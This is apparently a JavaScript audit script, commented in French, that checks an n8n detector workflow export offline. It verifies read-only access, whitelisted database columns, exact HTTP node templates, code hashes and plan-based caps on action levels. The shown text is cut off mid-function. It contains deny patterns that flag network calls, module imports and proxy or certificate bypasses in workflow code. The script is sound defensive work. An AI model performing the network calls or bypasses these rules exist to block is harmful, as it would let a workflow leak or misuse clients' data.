// Juge HORS LIGNE du workflow n8n `presti-detecteurs` (chantier 4, lot L3 n8n ; tâche 032-003, durci par 032-012 après l'audit 032-010).
//
// Il relit l'export du workflow (.orchestre/preuves/032-003/presti-detecteurs.workflow.json, tiré du n8n d'Oracle par le MCP) et :
//   1. vérifie sa structure : inactif ; seuls des nœuds de lecture (Schedule Trigger, Supabase get/getAll sur regles_automatisation,
//      HTTP Request en GET) et des nœuds Code ; chaque `select=` ne demande que des colonnes permises (brief
//      plans/011-cadrage-01-11/briefs/c4-n8n-detecteurs.md) ; aucune colonne nom, email, contact, adresse, message, contenu, texte ;
//      aucun nœud qui écrit, envoie ou appelle un modèle ; déclencheur à 6 h 45, fuseau Europe/Paris ;
//      É1 (032-012) : chaque nœud HTTP comparé à un GABARIT EXACT (clés et valeurs de `parameters` ET de `options`, pagination comprise) :
//      un proxy, des certificats non vérifiés, une redirection, une « next URL », une page de plus… rougissent ;
//   2. compare la copie figée des capacités à lib/plans.ts, et les listes d'outils à lib/pilote/regles.ts ; les seuils sourcés au code ;
//   3. É3 (032-012) : épingle l'empreinte SHA-256 du code de chaque nœud Code (toute différence : « nouvel audit requis »), puis rejoue
//      ce code dans un PROCESSUS ENFANT `node --permission` (ni écriture disque, ni lecture, ni processus, ni worker), dans un contexte
//      vm sans aucun objet de l'hôte (`vm.constants.DONT_CONTEXTIFY`), génération de code coupée ; les noms dangereux et `this` y sont
//      des pièges qui notent toute tentative ;
//   4. rejoue les détecteurs sur des cas FICTIFS : chacun déclenche, se tait, tient à la limite, change de clé d'étape ;
//      É2 (032-012) : un test PAR PROPRIÉTÉ — chaque détecteur × chaque offre × chaque condition du compte × plusieurs étapes et
//      montants (1 € à 100 000 €) — exige `niveau ≤ plafond(offre, détecteur)`, plafond calculé ICI par `peut()` (lib/plans.ts),
//      OUTILS_JAMAIS_AUTO et la table du plan §9 ; et, sur chaque constat de chaque cas, `outil ∈ OUTILS_JAMAIS_AUTO ⇒ niveau ≤ 2` ;
//   5. prouve qu'il sait rougir : des MUTANTS doivent tous faire échouer la suite, pour la bonne raison quand elle est nommée ; un
//      mutant du code est jugé SANS les empreintes, pour prouver que le rejeu le voit aussi (l'empreinte seule le verrait toujours).
//
// Lot L12 (032-019) : douze détecteurs (n° 11 réponse à une relance d'impayé, n° 12 entretien à proposer), les défauts moyens M1 à M12
// de 032-010 (chacun a ses cas et ses mutants plus bas, marqués « M… »), la branche d'erreur (rang 26), les clés refusées (rang 8).
//
// Aucun réseau, aucune base, aucun modèle. Lancement :
//   node --experimental-strip-types --import ./scripts/ts-loader.mjs scripts/detecteurs-n8n-qa.mjs [--export=<chemin d'un export>]
import { readFileSync } from 'node:fs'
import { createHash } from 'node:crypto'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { PLANS, peut } from '../lib/plans.ts'
import { OUTILS_JAMAIS_AUTO, OUTILS_EXECUTABLES_PILOTE, OUTIL_TYPE } from '../lib/pilote/regles.ts'
import { JOURS_PAR_DEFAUT, RATTRAPAGE_JOURS as RATTRAPAGE_IMPAYES, ECART_MIN } from '../lib/relancesImpayes.ts'
import { DELAI_AVIS_JOURS, RATTRAPAGE_JOURS as RATTRAPAGE_AVIS } from '../lib/apresChantier.ts'
import { VALIDITE_PAR_DEFAUT_JOURS } from '../lib/tableau-de-bord/calculer.ts'

const RACINE = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
// L'export du lot L12, tiré du n8n d'Oracle par le MCP après la dernière modification (032-019).
const ARG_EXPORT = process.argv.find((a) => a.startsWith('--export='))
const EXPORT = ARG_EXPORT ? path.resolve(ARG_EXPORT.slice('--export='.length)) : path.join(RACINE, '.orchestre/preuves/032-019/presti-detecteurs.workflow.json')
const WF = JSON.parse(readFileSync(EXPORT, 'utf8'))
// M8 : la borne haute du n° 6 est la dernière relance de conversation (CADENCE_RELANCES, lib/relances.ts:38). Lue dans le texte : le module
// importe la base (supabaseAdmin), que ce juge ne charge jamais.
const CADENCE_RELANCES = (() => {
  const m = readFileSync(path.join(RACINE, 'lib/relances.ts'), 'utf8').match(/export const CADENCE_RELANCES = \[([0-9, ]+)\]/)
  if (!m) throw new Error('CADENCE_RELANCES introuvable dans lib/relances.ts')
  return m[1].split(',').map(Number)
})()

// ─── Ce que n8n a le droit de lire (brief, « Les colonnes permises ») ─────────────────────────────────────────────────────────
const BASE = 'https://gorcdvmueakcncsmrouo.supabase.co/rest/v1/'
const IDENTIFIANT = 'dTewDK98MLrNckNG'
// L'ordre des colonnes est celui du `select=` attendu, à la lettre (M1). Ajouts de 032-019 : `artisans.leads_pause` (M3, 0189:38),
// `leads.prise_en_main` et `leads.updated_at` (M3, M4 ; 0189:42), `relances_impayes.jour` (M6, 0189:49), `relances_impayes_arrets.le`
// (n° 11, 0159:63), `crm_apres_chantier.entretien` et `.actif_depuis` (n° 12, M7 ; 0189:52), et trois tables : `crm_rappels` (n° 10 et 12,
// 0189:50, sans `texte` ni `client_cle`), `pilote_reglages` (M3, 0174:21-25), `assistant_actions` (rang 8, 0189:54, sans titre ni entrées).
const PERMISES = {
  artisans: ['id', 'plan', 'est_demo', 'suppression_demandee_le', 'leads_pause'],
  factures: ['id', 'artisan_id', 'devis_id', 'statut', 'date_echeance', 'total_ttc', 'avoir_de', 'payee_le', 'type_facture'],
  devis: ['id', 'artisan_id', 'statut', 'date_emission', 'validite_jours', 'acompte_pct', 'total_ttc', 'lead_id', 'accepte_le', 'envoye_le', 'created_at'],
  leads: ['id', 'artisan_id', 'statut', 'urgence', 'type_chantier', 'prise_en_main', 'created_at', 'updated_at'],
  chantiers: ['id', 'artisan_id', 'devis_id', 'statut', 'date_fin_reelle', 'maj_le'],
  chantier_materiaux: ['id', 'artisan_id', 'chantier_id', 'materiau_id', 'quantite', 'statut'],
  materiaux: ['id', 'artisan_id', 'seuil_alerte'],
  stock: ['id', 'materiau_id', 'quantite'],
  commandes_fournisseur: ['id', 'artisan_id', 'statut', 'chantier_id'],
  relances_impayes: ['id', 'artisan_id', 'facture_id', 'rang', 'jour', 'statut'],
  relances_impayes_arrets: ['facture_id', 'artisan_id', 'raison', 'le', 'reprise_le'],
  relances_impayes_reglages: ['artisan_id', 'actif', 'jours'],
  plateforme_config: ['artisan_id', 'mode_reponse'],
  prix_artisan: ['id', 'artisan_id', 'actif'],
  crm_apres_chantier: ['artisan_id', 'avis', 'entretien', 'actif_depuis'],
  crm_rappels: ['id', 'artisan_id', 'chantier_id', 'type', 'echeance', 'fait_le', 'envoye_le', 'origine', 'cle'],
  pilote_reglages: ['artisan_id', 'actif', 'types'],
  assistant_actions: ['id', 'artisan_id', 'outil', 'statut', 'objet_id', 'maj_le'],
}
// M1 (032-010) : chaque lecture, ses filtres aux noms ET aux valeurs attendus, dans l'ordre, puis `order` et `limit`. Une expression de
// compte neutralisée (`={{ 'not.is.null' }}`), un filtre retiré (`est_demo`, `suppression_demandee_le`, `plan`, celui du stock) rougit.
const PAR_COMPTE = "={{ 'in.(' + ($('Lire comptes').all().map(i => i.json.id).filter(Boolean).join(',') || '00000000-0000-0000-0000-000000000000') + ')' }}"
const PAR_MATERIAU = "={{ 'in.(' + ($('Lire materiaux').all().map(i => i.json.id).filter(Boolean).join(',') || '00000000-0000-0000-0000-000000000000') + ')' }}"
const compte = ['artisan_id', PAR_COMPTE]
const LECTURES_ATTENDUES = {
  'Lire comptes': { table: 'artisans', filtres: [['plan', 'in.(studio,signature,entreprise)'], ['est_demo', 'is.false'], ['suppression_demandee_le', 'is.null']], ordre: 'id' },
  'Lire factures': { table: 'factures', filtres: [compte], ordre: 'id' },
  'Lire devis': { table: 'devis', filtres: [compte], ordre: 'id' },
  'Lire demandes': { table: 'leads', filtres: [compte], ordre: 'id' },
  'Lire chantiers': { table: 'chantiers', filtres: [compte], ordre: 'id' },
  'Lire reservations': { table: 'chantier_materiaux', filtres: [compte, ['statut', 'eq.reserve']], ordre: 'id' },
  'Lire materiaux': { table: 'materiaux', filtres: [compte], ordre: 'id' },
  'Lire stock': { table: 'stock', filtres: [['materiau_id', PAR_MATERIAU]], ordre: 'id' },
  'Lire commandes': { table: 'commandes_fournisseur', filtres: [compte, ['statut', 'eq.commandee']], ordre: 'id' },
  'Lire relances impayes': { table: 'relances_impayes', filtres: [compte], ordre: 'id' },
  'Lire arrets de relance': { table: 'relances_impayes_arrets', filtres: [compte], ordre: 'facture_id' },
  'Lire reglages des relances': { table: 'relances_impayes_reglages', filtres: [compte], ordre: 'artisan_id' },
  'Lire reglages de la plateforme': { table: 'plateforme_config', filtres: [compte], ordre: 'artisan_id' },
  'Lire tarifs': { table: 'prix_artisan', filtres: [compte, ['actif', 'is.true']], ordre: 'id' },
  'Lire apres chantier': { table: 'crm_apres_chantier', filtres: [compte], ordre: 'artisan_id' },
  'Lire rappels': { table: 'crm_rappels', filtres: [compte, ['type', 'in.(demande_avis,entretien)']], ordre: 'id' },
  'Lire reglages du pilote': { table: 'pilote_reglages', filtres: [compte], ordre: 'artisan_id' },
  'Lire cartes refusees': { table: 'assistant_actions', filtres: [compte, ['statut', 'eq.refusee'], ['maj_le', "={{ 'gte.' + $now.setZone('Europe/Paris').minus({ days: 7 }).toISODate() }}"]], ordre: 'id' },
}
const INTERDIT = /nom|e-?mail|contact|adresse|message|contenu|texte/i
const TYPES_PERMIS = new Set(['n8n-nodes-base.scheduleTrigger', 'n8n-nodes-base.supabase', 'n8n-nodes-base.httpRequest', 'n8n-nodes-base.code', 'n8n-nodes-base.stickyNote', 'n8n-nodes-base.errorTrigger'])
// M11 (032-010) : la liste BLANCHE exacte des clés d'un constat sorti du nœud « Niveau proposé selon l offre ».
const CLES_CONSTAT = ['numero', 'detecteur', 'cle', 'artisan_id', 'objet', 'etape', 'montant_centimes', 'jours', 'argent', 'offre', 'niveau', 'outil', 'drapeaux', 'reserve']
const CLES_ALERTE = ['alerte', 'noeud', 'execution', 'mode']
// Premier filet, bon marché : des noms. Il se contourne par une concaténation (032-010, mutants C5 et C6) : les vraies barrières sont
// l'empreinte du code et le bac à sable du rejeu (É3).
const CODE_INTERDIT = /fetch\s*\(|httpRequest|\$http|require\s*\(|\bimport\s|axios|this\.helpers|helpers\.|getWorkflowStaticData|\$execution\.|XMLHttpRequest|WebSocket/
const PARAMS_PAGINATION = new Set(['select', 'order', 'limit', 'offset'])
const DETECTEURS = ['Détecteur 01 facture échue', 'Détecteur 02 chantier à facturer', 'Détecteur 03 devis signé sans acompte', 'Détecteur 04 devis sans réponse',
  'Détecteur 05 facture jamais envoyée (coupé)', 'Détecteur 06 demande sans réponse', 'Détecteur 07 demande sans devis', 'Détecteur 08 devis bientôt expiré',
  'Détecteur 09 stock sous le seuil', 'Détecteur 10 demande d avis', 'Détecteur 11 réponse à une relance d impayé', 'Détecteur 12 entretien à proposer']

// ─── É1 : le gabarit exact d'un nœud HTTP (032-010, défaut élevé É1) ───────────────────────────────────────────────────────────
// Toute clé absente de ces listes rougit : `proxy`, `allowUnauthorizedCerts`, `redirect`, `response`, `nextURL`,
// `responseContainsNextURL`, un en-tête, un second identifiant… Les valeurs sont comparées une à une.
const CLES_NOEUD = new Set(['id', 'name', 'type', 'typeVersion', 'position', 'parameters', 'credentials', 'alwaysOutputData', 'executeOnce'])
const CLES_HTTP = ['method', 'url', 'authentication', 'nodeCredentialType', 'sendQuery', 'specifyQuery', 'queryParameters', 'options']
const CLES_OPTIONS_HTTP = ['timeout', 'pagination']
const CLES_PAGINATION = ['paginationMode', 'parameters', 'paginationCompleteWhen', 'completeExpression', 'limitPagesFetched', 'maxRequests']
const PAGE = 1000
const OFFSET_ATTENDU = '={{ $pageCount * 1000 }}'
const FIN_ATTENDUE = '={{ !Array.isArray($response.body) || $response.body.length < 1000 }}'
const MAX_PAGES = 50
const DELAI_MAX_MS = 30000
const CLES_REGLAGES = new Set(['executionOrder', 'availableInMCP', 'timezone']) // pas d'`errorWorkflow` (032-010, M10, mutant C7)
const CLES_CODE = ['mode', 'language', 'jsCode']

// ─── É3 (a) : l'empreinte SHA-256 du code de chaque nœud Code (032-003, relu par 032-010 ; réépinglée par 032-019) ────────────────
// 032-019 : 14 codes changés, 3 neufs (n° 11, n° 12, « Message d échec ») ; « Départ des constats » et le n° 5 inchangés. Ces empreintes
// sont celles de l'auteur du lot L12, PAS encore d'un auditeur distinct : un nouvel audit suit (tâche à déposer), avant toute publication.
// Une différence n'est pas une erreur du juge : c'est un code que personne n'a relu. Nouvel audit par un agent distinct, puis nouvelle
// empreinte ici (`node -e` sur l'export : sha256 du champ `parameters.jsCode`, en UTF-8).
const EMPREINTES = new Map([
  ['Preuve de connexion', '9aca7631bd59fd4010c344219af45324eec02c73a3bfd95679774cb5c208e786'],
  ['Contexte du passage', '85f651bdf852be741173a607e0a80120afc26748e032d9bb2ab8848e2d5a7b80'],
  ['Capacités des offres', '582f32b54d667d7159969e8da099dbf25d4deb42b8cae99b8f4f9c779ca16c4c'],
  ['Départ des constats', 'cb8a2bf02133dadfd9fbe83dcbdaf6114b6f40334efba92f23d4683a1913e519'],
  ['Détecteur 01 facture échue', '0289fd9d488d798c02bed8411b161399259e98eceff514efd8bf2b876e0644f5'],
  ['Détecteur 02 chantier à facturer', 'a138868429e73a77268386bc9339cc8b4d38e5314b4fb5b466fb1aad708b1538'],
  ['Détecteur 03 devis signé sans acompte', '5929407841b78869df1878b43882a7b2bd1935329f4d24e71e5262925fd975a2'],
  ['Détecteur 04 devis sans réponse', 'd81c0bee2548a0bb644cee48fd21697708609271b88b510c3941559b3fbc8b11'],
  ['Détecteur 05 facture jamais envoyée (coupé)', 'fa1f4cd542432c4d6e9356fa0a086ddbca6aa0223c4846d2b170a980ee046362'],
  ['Détecteur 06 demande sans réponse', '8d7bf8d5a49f020a8e1ade0d3a168ca3097b56b611c3dc5ea3429303538d42c0'],
  ['Détecteur 07 demande sans devis', '95927a4740eebc21d85b34b06efbce886316133bd2ab146457ba78a62480cd81'],
  ['Détecteur 08 devis bientôt expiré', '5027396e95fe03f371177cff7fa93ded45e5fcdd2ff13cb2cba7cd322c39d347'],
  ['Détecteur 09 stock sous le seuil', '8b34ab01672f593f4ec828324ab5fa42e99709baef5a2ed7c2fb56a070b03789'],
  ['Détecteur 10 demande d avis', 'f524dec06a3dc1fa3dc2a94f9cc1ece4f2c4dd4142530daae28523a2c92b37a8'],
  ['Niveau proposé selon l offre', '821095eb15d1722309399a80472b3def1bc28ad430070118494ca681136768e8'],
  ['Bilan par détecteur', 'b8e95da87ed1d5e8762ced3b3f03b08b782ccb5edd17e6ded56c99d462b0e4b9'],
  ['Détecteur 11 réponse à une relance d impayé', '89376570dcacbc8240de95b8bc30eeb789c8f478a90b5a74d50e45b59d840d3a'],
  ['Détecteur 12 entretien à proposer', 'add3cf2519d30f53eec058b91fc65252df45e3e34c51ae1307d097cb92fb6324'],
  ['Message d échec', 'c6cd691c27dfb2c67d0afe898fbdfcddac269ea9a2a254b25a7a83c13fd3c278'],
])
const sha256 = (s) => createHash('sha256').update(String(s), 'utf8').digest('hex')

// ─── É2 : les plafonds, calculés DANS le juge (jamais lus dans la copie du workflow) ───────────────────────────────────────────
// Table du plan §9 (plans/011-cadrage-01-11/chantier-4-assistant-plan.md:585-594), colonne « Studio · Signature · Entreprise » et
// « Proposition (outil existant) » : n° 2, 3, 7, 9, 10 → 2 au plus partout ; n° 5 coupé → 0 ; n° 1, 4, 6, 8 → 3 possible, aux
// conditions du brief (« Le niveau proposé ») : `assistant.pilote` (plan §9 en tête), la capacité d'envoi du détecteur, l'outil hors
// OUTILS_JAMAIS_AUTO et dans OUTILS_EXECUTABLES_PILOTE (lib/pilote/regles.ts), et la condition du compte (impayés cochés : opt-in,
// lib/plans.ts:67 ; réponse en mode `auto`, défaut `assistee`, lib/plateformeConfig.ts:45).
// 032-019 : n° 11 et n° 12 → 2 au plus partout (plan §9, l.601-602) ; et, pour tout niveau 3, la condition `pilote` (M3) : pilote activé
// et type de l'outil activé (pilote_reglages ; typeActif, lib/pilote/regles.ts:111 ; OUTIL_TYPE, :53), aucune pause des demandes
// (artisans.leads_pause), et pour le n° 6 une demande que l'artisan n'a pas prise en main.
const PLAFONDS = {
  1: { outil: 'relancer_facture', max: 3, envoi: ['factures.relances.auto'], condition: 'impayes' },
  2: { outil: 'creer_facture', max: 2, envoi: [] },
  3: { outil: 'creer_facture', max: 2, envoi: [] },
  4: { outil: 'relancer_devis', max: 3, envoi: ['relances.auto'] },
  5: { outil: 'envoyer_facture', max: 0, envoi: [] },
  6: { outil: 'valider_reponse_proposee', max: 3, envoi: ['plateforme.ia.auto'], condition: 'auto' },
  7: { outil: 'creer_devis', max: 2, envoi: [] },
  8: { outil: 'relancer_devis', max: 3, envoi: ['relances.auto'] },
  9: { outil: 'preparer_liste_achat', max: 2, envoi: [] },
  10: { outil: 'demander_avis', max: 2, envoi: [] },
  11: { outil: 'relancer_facture', max: 2, envoi: [] },
  12: { outil: 'envoyer_rappel_entretien', max: 2, envoi: [] },
}
/** Le plus haut niveau qu'un constat du détecteur `numero` peut porter pour un compte de l'offre `plan` dans ces conditions. */
function plafond(plan, numero, conditions) {
  const d = PLAFONDS[numero]
  if (!d || d.max < 1) return 0
  let n = peut(plan, 'assistant') ? 2 : 1
  const partSeul = d.max >= 3 && peut(plan, 'assistant.pilote') && d.envoi.every((c) => peut(plan, c))
    && !OUTILS_JAMAIS_AUTO.includes(d.outil) && OUTILS_EXECUTABLES_PILOTE.includes(d.outil)
    && (!d.condition || conditions[d.condition] === true) && conditions.pilote === true
  if (partSeul) n = 3
  n = Math.min(n, d.max)
  return OUTILS_JAMAIS_AUTO.includes(d.outil) ? Math.min(n, 2) : n
}

/** Chaque constat d'un passage, contre les plafonds : appelé sur CHAQUE cas, pas sur un seul jeu (032-010, É2). */
function controler(titre, donnees, constats, ko) {
  const comptes = new Map((donnees['Lire comptes'] ?? []).map((a) => [a.id, a]))
  const impayes = new Set((donnees['Lire reglages des relances'] ?? []).filter((r) => r.actif === true).map((r) => r.artisan_id))
  const auto = new Set((donnees['Lire reglages de la plateforme'] ?? []).filter((p) => p.mode_reponse === 'auto').map((p) => p.artisan_id))
  const pilotes = new Map((donnees['Lire reglages du pilote'] ?? []).map((p) => [p.artisan_id, p]))
  const prises = new Set((donnees['Lire demandes'] ?? []).filter((l) => l.prise_en_main === true).map((l) => `${l.artisan_id}|${l.id}`))
  const piloteOuvert = (c, outil) => {
    const p = pilotes.get(c.artisan_id)
    const type = OUTIL_TYPE[outil]
    return !!p && p.actif === true && !!type && p.types?.[type] === true && comptes.get(c.artisan_id)?.leads_pause !== true
      && !(c.numero === 6 && prises.has(`${c.artisan_id}|${c.objet?.id}`))
  }
  for (const c of constats) {
    const ou = `${titre} : ${c?.cle}`
    // M11 : liste blanche exacte des clés, à chaque niveau.
    if (!clesExactes(c, CLES_CONSTAT)) { ko(`${ou} : clés du constat hors liste blanche (${Object.keys(c ?? {}).join(', ')})`); continue }
    if (!clesExactes(c.objet, ['type', 'id']) || (c.argent !== null && !clesExactes(c.argent, ['type', 'id']))) ko(`${ou} : objet ou argent hors liste blanche`)
    if (!Array.isArray(c.drapeaux) || c.drapeaux.some((x) => typeof x !== 'string')) ko(`${ou} : drapeaux illisibles`)
    if (c.reserve !== (c.niveau === 3 ? 'pilote' : null)) ko(`${ou} : un niveau 3 se dit « sous réserve du pilote » (reserve: 'pilote'), et lui seul (${c.reserve})`)
    const compte = comptes.get(c?.artisan_id)
    if (!compte) { ko(`${ou} : constat d'un compte non lu`); continue }
    if (c.offre !== compte.plan) ko(`${ou} : offre ${c.offre} annoncée pour un compte ${compte.plan}`)
    const d = PLAFONDS[c.numero]
    if (!d) { ko(`${ou} : détecteur inconnu (${c.numero})`); continue }
    if (c.outil !== d.outil) ko(`${ou} : outil ${c.outil}, ${d.outil} attendu (plan §9)`)
    const p = plafond(compte.plan, c.numero, { impayes: impayes.has(c.artisan_id), auto: auto.has(c.artisan_id), pilote: piloteOuvert(c, d.outil) })
    if (!Number.isInteger(c.niveau) || c.niveau < 1 || c.niveau > p) ko(`${ou} : niveau ${c.niveau} au-dessus du plafond ${p} (${compte.plan}, n° ${c.numero})`)
    if (OUTILS_JAMAIS_AUTO.includes(c.outil) && c.niveau > 2) ko(`${ou} : geste §3.2 (${c.outil}) au niveau ${c.niveau}`)
  }
}

const copie = (o) => JSON.parse(JSON.stringify(o))
const noeud = (wf, nom) => wf.nodes.find((n) => n.name === nom)
const codeDe = (wf, nom) => { const n = noeud(wf, nom); if (!n) throw new Error(`nœud absent : ${nom}`); return n.parameters.jsCode }
const memes = (a, b) => a.length === b.length && [...a].sort().join('|') === [...b].sort().join('|')
const clesExactes = (o, attendues) => o && typeof o === 'object' && !Array.isArray(o) && memes(Object.keys(o), attendues)

// ─── 1. Structure ──────────────────────────────────────────────────────────────────────────────────────────────────────────────
function structure(wf) {
  const e = []
  const ko = (m) => e.push(m)
  if (wf.active !== false) ko('le workflow doit être inactif (active: false)')
  if (wf.activeVersionId) ko('le workflow ne doit avoir aucune version publiée')
  if (wf.name !== 'presti-detecteurs') ko(`nom inattendu : ${wf.name}`)
  if (wf.settings?.timezone !== 'Europe/Paris') ko('fuseau du workflow : Europe/Paris attendu')
  for (const k of Object.keys(wf.settings ?? {})) if (!CLES_REGLAGES.has(k)) ko(`réglage du workflow non permis : settings.${k}`)
  for (const n of wf.nodes) {
    if (!TYPES_PERMIS.has(n.type)) ko(`type de nœud interdit : ${n.name} (${n.type})`)
    if (n.disabled) ko(`nœud désactivé : ${n.name}`)
    for (const k of Object.keys(n)) if (!CLES_NOEUD.has(k)) ko(`${n.name} : clé de nœud non permise (${k})`)
  }
  const declencheurs = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.scheduleTrigger')
  const r = declencheurs[0]?.parameters?.rule?.interval?.[0]
  if (declencheurs.length !== 1 || !r || r.field !== 'days' || r.triggerAtHour !== 6 || r.triggerAtMinute !== 45) ko('un seul déclencheur, tous les jours à 6 h 45, attendu')

  const supabases = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.supabase')
  if (supabases.length !== 1) ko(`un seul nœud Supabase attendu (${supabases.length})`)
  for (const n of supabases) {
    const p = n.parameters
    if (!['get', 'getAll'].includes(p.operation)) ko(`nœud Supabase ${n.name} : opération ${p.operation} interdite (get ou getAll seulement)`)
    if (p.tableId !== 'regles_automatisation') ko(`nœud Supabase ${n.name} : table ${p.tableId} interdite (regles_automatisation seulement)`)
    if (p.operation === 'getAll' && (p.returnAll || Number(p.limit) !== 1)) ko(`nœud Supabase ${n.name} : une seule ligne attendue`)
    if (n.credentials?.supabaseApi?.id !== IDENTIFIANT) ko(`nœud Supabase ${n.name} : identifiant « Supabase account » attendu`)
  }

  const https = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.httpRequest')
  if (https.length !== Object.keys(PERMISES).length) ko(`${Object.keys(PERMISES).length} lectures HTTP attendues (${https.length})`)
  const tablesLues = new Set()
  for (const n of https) {
    const p = n.parameters
    gabaritHttp(n, ko)
    const m = (p.method ?? 'GET').toUpperCase()
    if (m !== 'GET') ko(`${n.name} : méthode ${m} interdite (GET seulement)`)
    if (p.sendBody) ko(`${n.name} : un corps de requête est interdit`)
    if (p.sendHeaders) ko(`${n.name} : aucun en-tête (Prefer, etc.) n'est permis`)
    if (p.authentication !== 'predefinedCredentialType' || p.nodeCredentialType !== 'supabaseApi' || n.credentials?.supabaseApi?.id !== IDENTIFIANT) ko(`${n.name} : identifiant prédéfini supabaseApi « Supabase account » attendu`)
    if (typeof p.url !== 'string' || !p.url.startsWith(BASE)) { ko(`${n.name} : adresse hors de l'API REST du projet (${p.url})`); continue }
    const table = p.url.slice(BASE.length)
    if (!PERMISES[table]) { ko(`${n.name} : table non permise (${table})`); continue }
    tablesLues.add(table)
    const params = p.queryParameters?.parameters ?? []
    // M10 : sans `alwaysOutputData`, une lecture vide arrête la chaîne dans n8n (le rejeu, lui, rend un élément vide).
    if (n.alwaysOutputData !== true) ko(`${n.name} : alwaysOutputData: true attendu (M10 : une table vide arrêterait le passage)`)
    // M1 : la lecture, ses filtres aux noms ET aux valeurs, dans l'ordre exact.
    const a = LECTURES_ATTENDUES[n.name]
    if (!a) ko(`${n.name} : lecture inconnue du gabarit (M1)`)
    else {
      if (a.table !== table) ko(`${n.name} : table ${table}, ${a.table} attendue (M1)`)
      const attendus = [['select', PERMISES[a.table].join(',')], ...a.filtres, ['order', a.ordre], ['limit', String(PAGE)]]
      const lus = params.map((q) => [q?.name, String(q?.value)])
      if (JSON.stringify(lus) !== JSON.stringify(attendus)) ko(`${n.name} : paramètres de requête hors gabarit exact (M1) : ${lus.map(([k, v]) => k + '=' + v).join(' & ').slice(0, 300)}`)
    }
    if (!p.sendQuery || p.specifyQuery !== 'keypair') ko(`${n.name} : paramètres de requête en paires attendus`)
    const select = params.filter((q) => q.name === 'select')
    if (select.length !== 1) { ko(`${n.name} : un seul select= attendu`); continue }
    const colonnes = String(select[0].value).split(',').map((c) => c.trim())
    for (const c of colonnes) {
      if (!PERMISES[table].includes(c)) ko(`${n.name} : colonne ${table}.${c} hors de la liste permise`)
      if (INTERDIT.test(c)) ko(`${n.name} : colonne interdite ${table}.${c}`)
    }
    for (const q of params) {
      if (PARAMS_PAGINATION.has(q.name)) continue
      if (!PERMISES[table].includes(q.name)) ko(`${n.name} : filtre sur une colonne non permise (${q.name})`)
      const v = String(q.value)
      if (!/^(=\{\{|eq\.|in\.|is\.)/.test(v)) ko(`${n.name} : filtre ${q.name} hors de eq., in., is. (${v})`)
    }
    if (!params.some((q) => q.name === 'artisan_id') && !['artisans', 'stock'].includes(table)) ko(`${n.name} : lecture non filtrée par compte`)
    const limite = params.filter((q) => q.name === 'limit')
    if (limite.length !== 1 || String(limite[0].value) !== String(PAGE)) ko(`${n.name} : limit=${PAGE} attendu, une fois (pages de la pagination)`)
    if (params.some((q) => q.name === 'offset')) ko(`${n.name} : offset= vient de la pagination, pas des paramètres`)
  }
  for (const t of Object.keys(PERMISES)) if (!tablesLues.has(t)) ko(`table ${t} non lue`)

  for (const n of wf.nodes.filter((x) => x.type === 'n8n-nodes-base.code')) {
    const c = n.parameters.jsCode ?? ''
    if (!clesExactes(n.parameters, CLES_CODE)) ko(`${n.name} : paramètres du nœud Code hors gabarit (${Object.keys(n.parameters).join(', ')})`)
    if (n.parameters.language !== 'javaScript') ko(`${n.name} : JavaScript attendu`)
    if (n.parameters.mode !== 'runOnceForAllItems') ko(`${n.name} : mode runOnceForAllItems attendu`)
    if (CODE_INTERDIT.test(c)) ko(`${n.name} : appel réseau, module ou état persistant interdit dans un nœud Code`)
  }

  // La chaîne : Départ → les douze détecteurs dans l'ordre → Niveau → Bilan, et rien après le bilan.
  const chaine = chaineDepuis(wf, 'Départ des constats')
  const attendue = ['Départ des constats', ...DETECTEURS, 'Niveau proposé selon l offre', 'Bilan par détecteur']
  if (chaine.join('|') !== attendue.join('|')) ko(`chaîne des détecteurs inattendue : ${chaine.join(' → ')}`)

  // Rang 26 (plan §0 bis) : la branche d'erreur. Un seul Error Trigger, relié au seul « Message d échec », et rien après lui (aucun envoi
  // dans ce lot : le message attend l'identifiant Telegram et le « go » de Benj). Pas d'`errorWorkflow` (settings en liste blanche).
  const erreurs = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.errorTrigger')
  const branche = erreurs.length === 1 ? chaineDepuis(wf, erreurs[0].name) : []
  if (erreurs.length !== 1 || branche.length !== 2 || branche[1] !== 'Message d échec') ko(`branche d'erreur absente ou inattendue (rang 26) : un Error Trigger → « Message d échec », et rien après (${branche.join(' → ') || 'aucune'})`)
  // Le graphe entier (032-016, moyen 4) : chaque liaison est l'une de celles attendues, et chaque nœud hors note en reçoit une ou en est la source.
  const ordreLectures = ['Lire comptes', ...Object.keys(LECTURES_ATTENDUES).filter((k) => k !== 'Lire comptes')]
  const sequence = ['Déclencheur 6 h 45', 'Lecture de connexion (regles_automatisation)', 'Preuve de connexion', 'Contexte du passage', 'Capacités des offres', ...ordreLectures, ...attendue]
  const liaisons = new Set(sequence.slice(1).map((b, i) => `${sequence[i]}→${b}`))
  liaisons.add(`${erreurs[0]?.name}→Message d échec`)
  const vues = new Set()
  for (const [src, sorties] of Object.entries(wf.connections ?? {})) {
    for (const [genre, groupes] of Object.entries(sorties ?? {})) {
      for (const g of groupes ?? []) for (const l of g ?? []) {
        const k = `${src}→${l?.node}`
        if (genre !== 'main' || !liaisons.has(k) || l?.index !== 0) ko(`liaison inattendue : ${k} (${genre})`)
        vues.add(k)
      }
    }
  }
  for (const k of liaisons) if (!vues.has(k)) ko(`liaison attendue absente : ${k}`)
  return e
}

/** É1 : `parameters`, `options`, pagination et identifiant d'un nœud HTTP, clé par clé et valeur par valeur. */
function gabaritHttp(n, ko) {
  const p = n.parameters ?? {}
  if (n.typeVersion !== 4.5) ko(`${n.name} : HTTP Request 4.5 attendu (${n.typeVersion})`)
  if (n.executeOnce !== true) ko(`${n.name} : executeOnce attendu`)
  if (!clesExactes(n.credentials, ['supabaseApi']) || !clesExactes(n.credentials.supabaseApi, ['id', 'name']) || n.credentials.supabaseApi.name !== 'Supabase account') ko(`${n.name} : un seul identifiant, « Supabase account », attendu`)
  if (!clesExactes(p, CLES_HTTP)) ko(`${n.name} : paramètres HTTP hors gabarit (${Object.keys(p).join(', ')})`)
  if (!clesExactes(p.queryParameters, ['parameters']) || !Array.isArray(p.queryParameters.parameters) || p.queryParameters.parameters.some((q) => !clesExactes(q, ['name', 'value']))) ko(`${n.name} : paramètres de requête hors gabarit (name, value seulement)`)
  const o = p.options
